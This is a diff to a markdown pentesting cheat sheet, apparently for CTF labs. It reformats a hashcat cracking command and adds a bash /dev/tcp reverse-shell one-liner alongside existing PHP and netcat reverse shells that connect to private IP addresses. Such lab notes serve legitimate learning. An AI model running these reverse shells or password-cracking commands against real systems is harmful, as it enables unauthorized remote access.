@@ -16,7 +16,9 @@ Cipher: 85 110 112 97 99 107 32 116 104 105 115 32 66 67 68
 
 # Hashcat
 
-- hashcat -m 1800 -a 0 hash.txt rockyou.txt
+```bash
+hashcat -m 1800 -a 0 hash.txt rockyou.txt
+```
 
 # Find command
 
@@ -32,7 +34,7 @@ export PATH=/tmp:$PATH
 /usr/bin/menu
 ```
 
-<img src="/assets/images/kenobi.png" style="width:90%;"/>
+<img src="/assets/images/kenobi.png" style="align:center" />
 
 # Upgrading to a shell
 
@@ -46,6 +48,7 @@ SHELL=/bin/bash script -q /dev/null
 ```bash
 php -r '$sock=fsockopen("x.x.x.x",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.2.97 9001 >/tmp/f
+bash -c "bash -i >& /dev/tcp/10.2.8.75/8080 0>&1"
 ```
 
 # Blind OS injection
